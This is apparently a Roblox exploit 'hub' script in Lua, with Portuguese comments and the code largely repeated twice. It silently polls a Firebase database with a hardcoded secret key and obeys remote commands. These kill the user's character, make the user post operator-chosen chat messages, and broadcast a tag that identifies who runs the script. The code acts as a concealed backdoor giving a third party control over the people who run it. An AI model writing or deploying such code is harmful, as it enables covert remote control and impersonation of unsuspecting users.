local firebaseUrl = "https://gojo-hub-default-rtdb.firebaseio.com/"
local secretKey = "tAxUKU1BgidFb2xFco4FRYYz02y86gUw8ugZNjYf"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerName = player.Name

-- Enviar mensagem no chat Roblox
local function sendChatMessage(message)
    local success, _ = pcall(function()
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if channel then
            channel:SendAsync(message)
        else
            local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
            chatEvent:FireServer(message, "All")
        end
    end)
end

-- Tratar comando de chat
local function handleChatCommand(data)
    local originalMessage = data.message or ""
    print("[FakeHub] Chat recebido de " .. (data.from or "unknown") .. ": " .. originalMessage)
    sendChatMessage(originalMessage)
end

-- Checar comando "verifique"
local function checkVerifiqueCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl .. "commands/verifique.json?auth=" .. secretKey)
    end)

    if success and response and response ~= "null" then
        sendChatMessage("GOJO HUb_user") -- envia mensagem
        -- Apaga comando do Firebase
        pcall(function()
            local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
            if requestFunc then
                requestFunc({
                    Url = firebaseUrl .. "commands/verifique.json?auth=" .. secretKey,
                    Method = "DELETE",
                    Headers = { ["Content-Type"] = "application/json" },
                })
                print("[FakeHub] Comando verifique removido do Firebase.")
            end
        end)
    end
end

-- Checar comando kill
local function checkKillCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl .. "commands/" .. playerName .. ".json?auth=" .. secretKey)
    end)

    if success and response and response ~= "null" then
        local data = HttpService:JSONDecode(response)
        if data.action == "kill" and player.Character then
            player.Character:BreakJoints()
            warn("[FakeHub] Executando comando: kill")
        end
        -- Apagar comando kill
        pcall(function()
            local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
            if requestFunc then
                requestFunc({
                    Url = firebaseUrl .. "commands/" .. playerName .. ".json?auth=" .. secretKey,
                    Method = "DELETE",
                    Headers = { ["Content-Type"] = "application/json" },
                })
                print("[FakeHub] Comando kill removido do Firebase.")
            end
        end)
    end
end

-- Checar comando de chat
local function checkChatCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl .. "commands/Chat/" .. playerName .. ".json?auth=" .. secretKey)
    end)

    if success and response and response ~= "null" then
        local data = HttpService:JSONDecode(response)
        if data.action == "chat" and data.message then
            handleChatCommand(data)
        end
        -- Apagar comando chat
        pcall(function()
            local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
            if requestFunc then
                requestFunc({
                    Url = firebaseUrl .. "commands/Chat/" .. playerName .. ".json?auth=" .. secretKey,
                    Method = "DELETE",
                    Headers = { ["Content-Type"] = "application/json" },
                })
                print("[FakeHub] Comando chat removido do Firebase.")
            end
        end)
    end
end

-- Loop principal rodando em background
coroutine.wrap(function()
    while true do
        task.wait(1)
        checkKillCommand()
        checkChatCommand()
        checkVerifiqueCommand()
    end
end)()


-- chat control

local firebaseUrl = "https://gojo-hub-default-rtdb.firebaseio.com/"
local secretKey = "tAxUKU1BgidFb2xFco4FRYYz02y86gUw8ugZNjYf"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local playerName = player.Name

-- Função para enviar mensagem no chat Roblox
local function sendChatMessage(message)
    pcall(function()
        local channel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
        if channel then
            channel:SendAsync(message)
        else
            local chatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
            chatEvent:FireServer(message, "All")
        end
    end)
end

-- Checa comando de chat do admin
local function checkAdminChatCommand()
    local success, response = pcall(function()
        return game:HttpGet(firebaseUrl.."commands/send_message.json?auth="..secretKey)
    end)

    if success and response and response ~= "null" then
        local data = HttpService:JSONDecode(response)
        -- Verifica se a mensagem é para este player
        if data.target == playerName and data.message then
            sendChatMessage(data.message)
            print("[FakeHub] Mensagem do admin enviada: "..data.message)
        end

        -- Apaga comando do Firebase após envio
        pcall(function()
            local requestFunc = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or http.request
            if requestFunc then
                requestFunc({
                    Url = firebaseUrl.."commands/send_message.json?auth="..secretKey,
                    Method = "DELETE",
                    Headers = { ["Content-Type"]="application/json" },
                })
            end
        end)
    end
end

-- Loop principal
task.spawn(function()
    while true do
        task.wait(1)
        checkAdminChatCommand()
    end
end)
